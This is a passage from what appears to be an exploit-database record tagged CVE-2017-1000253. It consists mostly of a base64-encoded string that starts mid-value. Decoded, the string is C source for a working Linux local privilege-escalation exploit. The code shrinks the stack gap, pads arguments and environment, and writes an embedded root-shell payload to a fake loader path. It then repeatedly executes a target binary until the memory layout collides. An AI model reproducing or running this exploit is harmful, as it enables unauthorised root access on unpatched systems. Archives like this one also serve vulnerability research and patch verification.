CAgaWYgKGNwID49IGJhY2tncm91bmQgKyBzaXplb2YoYmFja2dyb3VuZCkpIGRpZSgpOw0KICAgIGlmIChjcCA8PSBiYWNrZ3JvdW5kKSBkaWUoKTsNCiAgICBpZiAoKmNwKSBkaWUoKTsNCiAgICBpZiAoc3RybGVuKGJhY2tncm91bmQpICE9IChzaXplX3QpKGNwIC0gYmFja2dyb3VuZCkpIGRpZSgpOw0KICAgIGlmIChzdHJsZW4oYmFja2dyb3VuZCkgIT0gc3RyY3NwbihiYWNrZ3JvdW5kLCAiICw6IikpIGRpZSgpOw0KICB9DQoNCiAgICBzdGF0aWMgY2hhciBwYWRbTUFYX0FSR19TVFJMRU5dOw0KICAgIG1lbXNldChwYWQsICcgJywgc2l6ZW9mKHBhZCktMSk7DQogICAgaWYgKHBhZFtzaXplb2YocGFkKS0xXSkgZGllKCk7DQogICAgaWYgKHN0cmxlbihwYWQpICE9IHNpemVvZihwYWQpLTEpIGRpZSgpOw0KICAgIGlmIChzaXplb2YocGFkKSAlIFNUQUNLX0FMSUdOKSBkaWUoKTsNCiAgew0KICAgIGRvdWJsZSBwcm9iYWJpbGl0eSA9IG5wYWRzICogc2l6ZW9mKHBhZCkgLSAoMTI4PDwyMCk7DQogICAgcHJvYmFiaWxpdHkgKj0gcHJvYmFiaWxpdHkgLyAyOw0KICAgIHByb2JhYmlsaXR5IC89ICgxNlVMPDwzMCk7DQogICAgcHJvYmFiaWxpdHkgLz0gKCAxVUw8PDQwKTsNCiAgICBwcmludGYoInByb2JhYmlsaXR5IDEvJXp1CiIsIChzaXplX3QpKDEgLyBwcm9iYWJpbGl0eSkpOw0KICB9DQoNCiAgICBzdGF0aWMgY2hhciBhcmcwW01BWF9BUkdfU1RSTEVOXTsNCiAgICBpZiAoYXJnMF9zaXplID49IHNpemVvZihhcmcwKSkgZGllKCk7DQogICAgaWYgKGFyZzBfc2l6ZSA8PSAwKSBkaWUoKTsNCiAgICBtZW1zZXQoYXJnMCwgJyAnLCBhcmcwX3NpemUtMSk7DQogICAgc3RhdGljIGNoYXIgYXJnMltNQVhfQVJHX1NUUkxFTl07DQoNCiAgICBjb25zdCBzaXplX3QgbmFyZ3MgPSAzICsgbnBhZHMgLSAoYXJnMF9zaXplLTEpOw0KICAgIGNoYXIgKiogY29uc3QgYXJndiA9IGNhbGxvYyhuYXJncyArIDEsIHNpemVvZihjaGFyICopKTsNCiAgICBpZiAoIWFyZ3YpIGRpZSgpOw0KICB7DQogICAgY2hhciAqKiBhcCA9IGFyZ3Y7DQogICAgKmFwKysgPSBhcmcwOw0KICAgICphcCsrID0gIi0taGVscCI7DQogICAgKmFwKysgPSBhcmcyOw0KICAgIHNpemVfdCBuOw0KICAgIGZvciAobiA9IGFwIC0gYXJndjsgbiA8IG5hcmdzOyBuKyspIHsNCiAgICAgICAgKmFwKysgPSBwYWQ7DQogICAgfQ0KICAgIGlmIChhcCAhPSBhcmd2ICsgbmFyZ3MpIGRpZSgpOw0KICAgIGlmICgqYXApIGRpZSgpOw0KICB9DQoNCiAgICBjb25zdCBzaXplX3QgbmVudnMgPSAyICsgYXJnMF9zaXplLTE7DQogICAgY2hhciAqKiBjb25zdCBlbnZwID0gY2FsbG9jKG5lbnZzICsgMSwgc2l6ZW9mKGNoYXIgKikpOw0KICAgIGlmICghZW52cCkgZGllKCk7DQogIHsNCiAgICBjaGFyICoqIGVwID0gZW52cDsNCiAgICAqZXArKyA9IGJhY2tncm91bmQ7DQogICAgKmVwKysgPSBmb3JlZ3JvdW5kOw0KICAgIHNpemVfdCBuOw0KICAgIGZvciAobiA9IGVwIC0gZW52cDsgbiA8IG5lbnZzOyBuKyspIHsNCiAgICAgICAgKmVwKysgPSBwYWQ7DQogICAgfQ0KICAgIGlmIChlcCAhPSBlbnZwICsgbmVudnMpIGRpZSgpOw0KICAgIGlmICgqZXApIGRpZSgpOw0KICB9DQoNCiAgew0KICAgIHNpemVfdCBsZW4gPSBzdHJsZW4oYmluYXJ5KSsxICsgc2l6ZW9mKHZvaWQgKik7DQogICAgY2hhciAqIGNvbnN0ICogY29uc3QgX19zdHJwcFtdID0geyBhcmd2LCBlbnZwLCBOVUxMIH07DQogICAgY2hhciAqIGNvbnN0ICogY29uc3QgKiBzdHJwcDsNCiAgICBmb3IgKHN0cnBwID0gX19zdHJwcDsgKnN0cnBwOyBzdHJwcCsrKSB7DQogICAgICAgIGNoYXIgKiBjb25zdCAqIHN0cnA7DQogICAgICAgIGZvciAoc3RycCA9ICpzdHJwcDsgKnN0cnA7IHN0cnArKykgew0KICAgICAgICAgICAgbGVuICs9IHN0cmxlbigqc3RycCkgKyAxOw0KICAgICAgICB9DQogICAgfQ0KICAgIGxlbiA9IDEgKyBQQUdFU1ogLSBsZW4gJSBQQUdFU1o7DQogICAgbWVtc2V0KGFyZzIsICcgJywgbGVuKTsNCiAgfQ0KDQogIHsNCiAgICBpZiAobnBhZHMgKiBzaXplb2YocGFkKSArICgxPDwyMCkgPj0gTUlOX0dBUCAvIDQpIGRpZSgpOw0KICAgIGNvbnN0IHN0cnVjdCBybGltaXQgcmxpbWl0X3N0YWNrID0geyBNSU5fR0FQLCBNSU5fR0FQIH07DQogICAgaWYgKHNldHJsaW1pdChSTElNSVRfU1RBQ0ssICZybGltaXRfc3RhY2spKSBkaWUoKTsNCiAgfQ0KICAgIGNvbnN0IGludCBkZXZfbnVsbCA9IG9wZW4oIi9kZXYvbnVsbCIsIE9fV1JPTkxZKTsNCiAgICBpZiAoZGV2X251bGwgPD0gLTEpIGRpZSgpOw0KDQogIHsNCiAgICBzdGF0aWMgY2hhciBsZHNvW10gPSAiLiIgTERTTzsNCiAgICBjaGFyICogY29uc3Qgc2xhc2ggPSBzdHJyY2hyKGxkc28sICcvJyk7DQogICAgaWYgKCFzbGFzaCkgZGllKCk7DQogICAgKnNsYXNoID0gJwAnOw0KICAgIG1rZGlyKGxkc28sIDA3NTUpOw0KICAgICpzbGFzaCA9ICcvJzsNCg0KICAgIGNvbnN0IGludCBmZCA9IG9wZW4obGRzbywgT19XUk9OTFkgfCBPX0NSRUFUIHwgT19UUlVOQyB8IE9fTk9GT0xMT1csIDA3NTUpOw0KICAgIGlmIChmZCA8PSAtMSkgZGllKCk7DQogICAgc3RhdGljIGNvbnN0DQogICAgI2luY2x1ZGUgInJvb3RzaGVsbC5oIg0KICAgIGlmICh3cml0ZShmZCwgcm9vdHNoZWxsLCByb290c2hlbGxfbGVuKSAhPSAoc3NpemVfdClyb290c2hlbGxfbGVuKSBkaWUoKTsNCiAgICBpZiAoY2xvc2UoZmQpKSBkaWUoKTsNCiAgfQ0KDQogICAgc2l6ZV90IHRyeTsNCiAgICBmb3IgKHRyeSA9IDE7IHRyeTsgdHJ5KyspIHsNCiAgICAgICAgaWYgKGZmbHVzaChzdGRvdXQpKSBkaWUoKTsNCiAgICAgICAgY29uc3QgcGlkX3QgcGlkID0gZm9yaygpOw0KICAgICAgICBpZiAocGlkIDw9IC0xKSBkaWUoKTsNCiAgICAgICAgaWYgKHBpZCA9PSAwKSB7DQogICAgICAgICAgICBpZiAoZHVwMihkZXZfbnVsbCwgU1RET1VUX0ZJTEVOTykgIT0gU1RET1VUX0ZJTEVOTykgZGllKCk7DQogICAgICAgICAgICBpZiAoZHVwMihkZXZfbnVsbCwgU1RERVJSX0ZJTEVOTykgIT0gU1RERVJSX0ZJTEVOTykgZGllKCk7DQogICAgICAgICAgICBpZiAoZGV2X251bGwgPiBTVERFUlJfRklMRU5PKSBpZiAoY2xvc2UoZGV2X251bGwpKSBkaWUoKTsNCiAgICAgICAgICAgIGV4ZWN2ZShiaW5hcnksIGFyZ3YsIGVudnApOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICAgICAgaW50IHN0YXR1cyA9IDA7DQogICAgICAgIHN0cnVjdCB0aW1ldmFsIHN0YXJ0LCBzdG9wLCBkaWZmOw0KICAgICAgICBpZiAoZ2V0dGltZW9mZGF5KCZzdGFydCwgTlVMTCkpIGRpZSgpOw0KICAgICAgICBpZiAod2FpdHBpZChwaWQsICZzdGF0dXMsIFdVTlRSQUNFRCkgIT0gcGlkKSBkaWUoKTsNCiAgICAgICAgaWYgKGdldHRpbWVvZmRheSgmc3RvcCwgTlVMTCkpIGRpZSgpOw0KICAgICAgICB0aW1lcnN1Yigmc3RvcCwgJnN0YXJ0LCAmZGlmZik7DQogICAgICAgIHByaW50ZigidHJ5ICV6dSAlbGQuJTA2bGQgIiwgdHJ5LCBkaWZmLnR2X3NlYywgZGlmZi50dl91c2VjKTsNCg0KICAgICAgICBpZiAoV0lGU0lHTkFMRUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgcHJpbnRmKCJzaWduYWwgJWQKIiwgV1RFUk1TSUcoc3RhdHVzKSk7DQogICAgICAgICAgICBzd2l0Y2ggKFdURVJNU0lHKHN0YXR1cykpIHsNCiAgICAgICAgICAgICAgICBjYXNlIFNJR0tJTEw6DQogICAgICAgICAgICAgICAgY2FzZSBTSUdTRUdWOg0KICAgICAgICAgICAgICAgIGNhc2UgU0lHQlVTOg0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIGlmIChXSUZFWElURUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgcHJpbnRmKCJleGl0ZWQgJWQKIiwgV0VYSVRTVEFUVVMoc3RhdHVzKSk7DQogICAgICAgIH0gZWxzZSBpZiAoV0lGU1RPUFBFRChzdGF0dXMpKSB7DQogICAgICAgICAgICBwcmludGYoInN0b3BwZWQgJWQKIiwgV1NUT1BTSUcoc3RhdHVzKSk7DQogICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHByaW50ZigidW5rbm93biAlZAoiLCBzdGF0dXMpOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICB9DQogICAgZGllKCk7DQp9", 
    "id": "42887", 
    "cves": [
        "CVE-2017-1000253"
    ]
}